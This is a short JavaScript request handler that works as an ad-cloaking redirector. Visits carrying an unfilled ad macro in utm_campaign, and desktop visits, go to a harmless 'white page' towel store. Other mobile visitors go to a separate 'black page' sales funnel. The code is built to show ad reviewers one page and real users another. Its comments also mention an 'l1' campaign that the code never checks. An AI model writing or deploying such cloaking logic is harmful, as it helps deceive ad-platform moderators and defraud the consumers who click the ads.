export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://justsalontowels.com/products/dobby-border-bath-towels-27x54-wholesaler-usa?srsltid=AfmBOooslZ318ZiLAZjaHraeJM7N_KFTh68PkpHxIf8kkBt8dpHa4zdF";
    const blackPageURL = "https://yabhewmyum.myfunnelish.com/women-pink-socks-1736431298205946-1736431371071188";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
